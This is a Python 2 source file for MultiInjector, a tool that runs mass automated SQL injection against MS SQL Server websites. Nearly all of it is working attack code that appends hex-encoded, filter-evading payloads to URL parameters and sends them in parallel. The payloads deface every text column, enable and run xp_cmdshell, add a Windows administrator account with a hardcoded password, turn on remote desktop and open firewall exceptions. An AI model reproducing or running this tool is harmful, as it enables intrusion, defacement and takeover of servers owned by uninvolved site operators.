#!/usr/bin/env python2
"""
    MultiInjector v.035
    Copyright 2009-2011, Raviv Raz - ravivr@gmail.com
    MultiInjector is distributed under the terms of the GNU General Public License
    MultiInjector is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

"""
try:
	import psyco
except:
	pass
from sys import stdout,argv,stderr
import pycurl
from urlparse import urlsplit,urlunsplit
from urllib import quote
from os import system
import binascii
import StringIO
from re import findall

class callback:
    def __init__(self):
        self.contents = ''
        buffer = StringIO.StringIO
    def feed(self, buf):
        self.contents = self.contents + buf

def fireUp(target_list,num_conn,proxy_addr,proxy_port):
   tuples = target_list
   try:
       import signal
       from signal import SIGPIPE, SIG_IGN
       signal.signal(signal.SIGPIPE, signal.SIG_IGN)
   except ImportError:
       pass
   queue = []
   for tuple in tuples:
       for url in tuple:
           if not url or url[0] == "#":
               url = str(url).strip()
               continue
           cb = callback()
           queue.append((url,cb))
   num_urls = len(queue)
   num_conn = min(num_conn, num_urls)
   assert 1 <= num_conn <= 10000, "invalid number of concurrent connections"
   m = pycurl.CurlMulti()
   m.handles = []
   for i in range(num_conn):
       c = pycurl.Curl()
       c.setopt(pycurl.FOLLOWLOCATION, 1)
       c.setopt(pycurl.MAXREDIRS, 5)
       c.setopt(pycurl.CONNECTTIMEOUT, 30)
       c.setopt(pycurl.TIMEOUT, 300)
       c.setopt(pycurl.NOSIGNAL, 1)
       c.setopt(pycurl.USERAGENT,"""Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)""")
       c.setopt(pycurl.HTTPHEADER, ["""Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5""" ,
                                          """Accept-Language: en-us,en;q=0.5""",
                                          """Accept-Encoding: gzip,deflate""",
                                          """Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7""",
                                          """Keep-Alive: 300""",
                                          """Connection: keep-alive"""])
       if proxy_addr != '':
          c.setopt(pycurl.PROXY,proxy_addr)
          c.setopt(pycurl.PROXYPORT,proxy_port)
       m.handles.append(c)
   freelist = m.handles[:]
   num_processed = 0
   while num_processed < num_urls:
       while queue and freelist:
           url,cb = queue.pop(0)
           c = freelist.pop()
           c.setopt(pycurl.URL, url)
           c.setopt(pycurl.WRITEFUNCTION, cb.feed)
           m.add_handle(c)
           c.url = url
       while 1:
           ret, num_handles = m.perform()
           if ret != pycurl.E_CALL_MULTI_PERFORM:
               break
       while 1:
           num_q, ok_list, err_list = m.info_read()
           for c in ok_list:
               m.remove_handle(c)
               freelist.append(c)
           for c, errno, errmsg in err_list:
               m.remove_handle(c)
               freelist.append(c)
           num_processed = num_processed + len(ok_list) + len(err_list)
           if num_q == 0:
               break
       m.select(1.0)
   for c in m.handles:
       c.close()
   m.close()
def usage():
    stdout.write("""\nCopyright 2008, Raviv Raz - ravivr@gmail.com\nThis program is distributed under the terms of the GNU General Public License\nMultiInjector is an automatic SQL injection utility. It uses a list of URI addresses to test parameter manipulation.\n\
Once a vulnerable parameter has been found, a signature-evasive SQL injection is performed in order to achieve\n\
one of the following goals:\n
1) Automatic defacement
2) Run OS shell command on DB server
3) Run SQL query on DB server
4) Enable OS shell procedure on DB
5) Add administrative user to DB server with password: T0pSeKret
6) Enable remote desktop on DB server
7) Add allowed program to Windows Firewall on DB server
\nUsage: %s [url list] \n\n"""%argv[0])
    raise SystemExit
def build_payload(input,choice,program_name):
    program_name = program_name.replace("\'","\\'").replace('\"','\\"').replace('>','\>')
    input = input.replace("\'","\\'").replace('\"','\\"').replace('>','\>')
    if choice ==1:
        sql_cmd = """DECLARE @T VARCHAR(255),@C VARCHAR(255) DECLARE Table_Cursor CURSOR FOR SELECT a.name,b.name FROM sysobjects a,syscolumns b WHERE a.id=b.id AND a.xtype='u' AND (b.xtype=99 OR b.xtype=35 OR b.xtype=231 OR b.xtype=167) OPEN Table_Cursor FETCH NEXT FROM Table_Cursor INTO @T,@C WHILE(@@FETCH_STATUS=0) BEGIN EXEC('UPDATE ['+@T+'] SET ['+@C+']=RTRIM(CONVERT(VARCHAR(4000),['+@C+']))+''%s''') FETCH NEXT FROM Table_Cursor INTO @T,@C END CLOSE Table_Cursor DEALLOCATE Table_Cursor;"""%input
    elif choice ==2:
        sql_cmd = """EXEC MASTER..XP_CMDSHELL '%s'"""%input
    elif choice ==3:
        sql_cmd = """EXEC '%s'"""%input
    elif choice ==4:
        sql_cmd = """EXEC sp_configure 'show advanced options',1 ; RECONFIGURE ; EXEC sp_configure 'xp_cmdshell',1 ; RECONFIGURE"""
    elif choice ==5:
        sql_cmd = """EXEC MASTER..XP_CMDSHELL 'net user %s T0pSeKret /add && net localgroup administrators %s /add'"""%(input,input)
    elif choice ==6:
        sql_cmd = """EXECUTE master.dbo.xp_regwrite N'HKEY_LOCAL_MACHINE',N'SYSTEM\CurrentControlSet\Control\Terminal Server',N'fDenyTSConnections',N'REG_DWORD',0;--"""
    elif choice ==7:
        input = input.replace("\'","\\'").replace('\"','\\"')
        sql_cmd = """EXEC MASTER..XP_CMDSHELL 'netsh firewall add allowedprogram %s %s ENABLE'"""%(input,program_name)
    if len(input) % 2 == 0:
        payload = binascii.hexlify(sql_cmd)
    else:
        payload = binascii.hexlify(sql_cmd[:-1])
    cmd = " or 1=1;DECLARE @S VARCHAR(4000);SET @S=CAST(0x%s AS VARCHAR(4000));EXEC(@S);--"%payload
    return quote(cmd)
def fullurl(host,path,params):
    return urlunsplit(('http',host,path,params,''))
def is_numeric(param):
    if findall("^.*=[0-9]+$",param):
        return True
    else:
        return False
def change_params(params,payload):
    new_list = []
    split_params = params.split('&')
    for i in range(len(split_params)):
        if is_numeric(split_params[i]):
            new_param = str(split_params[i])+payload
        else:
            new_param = str(split_params[i])+"%27"+payload
        new_list.append(params.replace(split_params[i],new_param))
    return new_list
def add_payload(url,payload):
    spliturl = urlsplit(url,allow_fragments=True)
    protocol = spliturl[0]
    host = spliturl[1]
    params = spliturl[3]
    path = spliturl[2]
    new_params = change_params(params,payload)
    new_urls =[]
    for param in new_params:
        new_urls.append(fullurl(host,path,param))
    return new_urls
def find_parameterized_urls(list):
    newlist = []
    for item in list:
        if urlsplit(item)[3] != '':
            newlist.append(item.strip())
    return newlist
def menu():
    conn_num = 5
    system('cls')
    stdout.write("""
Please choose the attack of your flavor:\n
1) Automatic defacement
2) Run OS shell command on DB server
3) Run SQL query on DB server
4) Enable OS shell procedure on DB
5) Add administrative user to DB server with password: T0pSeKret
6) Enable remote desktop on DB server
7) Add allowed program to Windows Firewall on DB server
                 \n""")
    try:
        program = ""
        choice = int(raw_input("> "))
        if choice == 1:
            command = str(raw_input("\n\nEnter defacement content:\n\n> "))
        elif choice == 2:
            command = str(raw_input("\n\nEnter OS command to run:\n\n> "))
        elif choice == 3:
            command = str(raw_input("\n\nEnter SQL query to run:\n\n> "))
        elif choice == 4:
            command = ""
        elif choice == 5:
            command = str(raw_input("\n\nEnter administrative user name:\n\n>"))
        elif choice == 6:
            command = ""
        elif choice == 7:
            command = str(raw_input("Enter program full path (c:\path\program.exe):\n>"))
            program = str(raw_input("Enter program name in firewall allowed programs list:\n>"))
        elif not choice in (1,2,3,4,5,6,7):
            menu()
    except KeyboardInterrupt:
        stdout.write('\n\nC ya!\n\n')
        raise SystemExit
    except:
        menu()
    stdout.write('Number of parallel connections: (default=5)\n')
    try:
        conn_num = int(raw_input("> "))
    except:
        conn_num = 5
    stdout.write('Use HTTP proxy? [y/n]: (default=n)\n')
    use_proxy = (raw_input("> "))
    if 'y' in use_proxy:
        stdout.write('Proxy address: \n')
        proxy_addr = (raw_input("> "))
        stdout.write('Proxy port: \n')
        proxy_port = int(raw_input("> "))
    else:
        proxy_addr = ''
        proxy_port = 0
    return choice,command,conn_num,proxy_addr,proxy_port,program
def main():
    if len(argv)<2:
        usage()
    else:
        try:
            stdout.write('\n[!] Opening url file...\n')
            old_urls = open(argv[1]).readlines()
        except:
            stderr.write("""\n[x] Failed to open %s \n"""%argv[1])
            raise SystemExit
        choice,command,conn_num,proxy_addr,proxy_port,program_name = menu()
        payload = build_payload(command,choice,program_name)
    stdout.write('[!] Bombs Away !!\n')
    urls = []
    for item in find_parameterized_urls(old_urls):
        injected = add_payload(item,payload)
        urls.append(injected)
    if len(urls)>0:
        if proxy_addr !='':
            fireUp(urls,conn_num,proxy_addr,proxy_port)
        elif proxy_addr =='':
            fireUp(urls,conn_num,'',0)
        stdout.write('[v] Attacks finished\n')
    else:
        print """[x] No URL found with parameters to inject.\nWe must have at least one URL like:\nhttp://www.victim.com/program.asp?p1=v1&p2=v2"""
if __name__ == "__main__":
    main()
